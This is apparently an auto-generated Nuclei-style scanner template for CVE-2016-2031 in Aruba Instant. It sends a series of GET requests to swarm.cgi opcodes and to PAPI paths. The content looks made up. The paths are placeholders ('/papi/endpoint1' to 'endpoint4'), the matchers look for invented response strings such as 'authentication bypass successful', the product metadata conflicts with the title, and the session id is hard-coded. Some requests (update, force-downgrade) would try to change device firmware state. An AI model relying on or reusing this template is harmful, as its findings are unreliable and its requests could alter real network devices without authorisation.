id: CVE-2016-2031

info:
  name: Aruba Instant Multiple Vulnerabilities
  author: ProjectDiscoveryAI
  severity: critical
  description: Multiple vulnerabilities exist in Aruba Instant before 4.1.3.0 and 4.2.3.1 due to insufficient validation of user-supplied input and insufficient checking of parameters, which could allow a malicious user to bypass security restrictions, obtain sensitive information, perform unauthorized actions, and execute arbitrary code.
  impact: |
    High: Remote code execution or DoS.
  remediation: |
    Apply the necessary patches provided by Aruba Networks to mitigate the vulnerabilities.
  reference:
    - https://cert-portal.siemens.com/productcert/pdf/ssa-431802.pdf
    - https://github.com/ARPSyndicate/cvemon
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2016-2031
    cwe-id: CWE-20
    epss-score: 0.0097
    epss-percentile: 0.8397
    cpe: cpe:2.3:a:arubanetworks:airwave:*:*:*:*:*:*:*:*
  metadata:
    vendor: arubanetworks
    product: airwave

http:
  - method: GET
    path:
      - "{{BaseURL}}/swarm.cgi?opcode=check-firmware"

    matchers:
      - type: word
        words:
          - "Firmware Version: 4.1.2.0"
          - "Build Date: 2015-12-01"
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/swarm.cgi?opcode=auto-update&ip=127.0.0.1&auto_reboot=false&refresh=true&sid=OWsiU5MM7DxVf9FRWe3P&nocache=0.9368100591919084"

    matchers:
      - type: status
        status:
          - 200

  - method: GET
    path:
      - "{{BaseURL}}/swarm.cgi?opcode=update&ip=127.0.0.1&auto_reboot=false&refresh=true&sid=OWsiU5MM7DxVf9FRWe3P&nocache=0.9368100591919084"

    matchers:
      - type: word
        words:
          - "update successful"
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/swarm.cgi?opcode=force-downgrade&ip=127.0.0.1&auto_reboot=false&refresh=true&sid=OWsiU5MM7DxVf9FRWe3P&nocache=0.9368100591919084"

    matchers:
      - type: word
        words:
          - "downgrade successful"
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/swarm.cgi?opcode=check-update&ip=127.0.0.1&auto_reboot=false&refresh=true&sid=OWsiU5MM7DxVf9FRWe3P&nocache=0.9368100591919084"

    matchers:
      - type: word
        words:
          - "update check"
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/firmware/4.1.2.0/firmware.bin"

    matchers:
      - type: word
        words:
          - "firmware download successful"
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/swarm.cgi?opcode=challenge-response&ip=127.0.0.1&auto_reboot=false&refresh=true&sid=OWsiU5MM7DxVf9FRWe3P&nocache=0.9368100591919084"

    matchers:
      - type: word
        words:
          - "challenge-response successful"
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/papi/endpoint1"

    matchers:
      - type: word
        words:
          - "PAPI endpoint access"
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/papi/endpoint2"

    matchers:
      - type: word
        words:
          - "MD5 signature validation failed"
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/papi/endpoint3"

    matchers:
      - type: word
        words:
          - "weak encryption detected"
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/papi/endpoint4"

    matchers:
      - type: word
        words:
          - "authentication bypass successful"
        part: body
